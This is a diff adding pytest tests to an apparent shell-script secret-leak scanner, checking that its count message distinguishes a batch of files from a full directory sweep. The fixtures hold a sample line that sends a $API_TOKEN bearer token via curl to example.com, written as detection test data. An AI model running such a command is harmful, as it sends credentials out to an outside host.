@@ -93,3 +93,34 @@ class TestOutput:
         )
         main([str(path)])
         assert "SHELL only" in capsys.readouterr().err
+
+
+class TestTheCountOnlyClaimsWhatItMeasured:
+    """pre-commit splits staged files across several invocations, so a scan-wide census
+    printed from one of them describes the BATCH, not the tree.
+
+    Found on the first real run: seven batches each announced "1 in 3 shell script(s)
+    scanned" for a repo holding 38 of them. A confident number that is really measuring
+    the instrument is worse than no number at all.
+    """
+
+    def test_a_file_list_does_not_claim_a_census(self, tmp_path: Path, capsys: pytest.CaptureFixture[str]):
+        path = _script(
+            tmp_path / "leak.sh",
+            '#!/bin/bash\ncurl -H "Bearer $API_TOKEN" example.com\n',
+        )
+        main([str(path)])
+        err = capsys.readouterr().err
+        assert "the file(s) checked" in err
+        assert "swept" not in err
+
+    def test_a_directory_sweep_does_claim_one(self, tmp_path: Path, capsys: pytest.CaptureFixture[str]):
+        """The counter-case: a sweep really is the census, so it keeps the count."""
+        _script(
+            tmp_path / "leak.sh",
+            '#!/bin/bash\ncurl -H "Bearer $API_TOKEN" example.com\n',
+        )
+        _script(tmp_path / "clean.sh", "#!/bin/bash\necho hi\n")
+        main([str(tmp_path)])
+        err = capsys.readouterr().err
+        assert "1 in 2 shell script(s) swept" in err
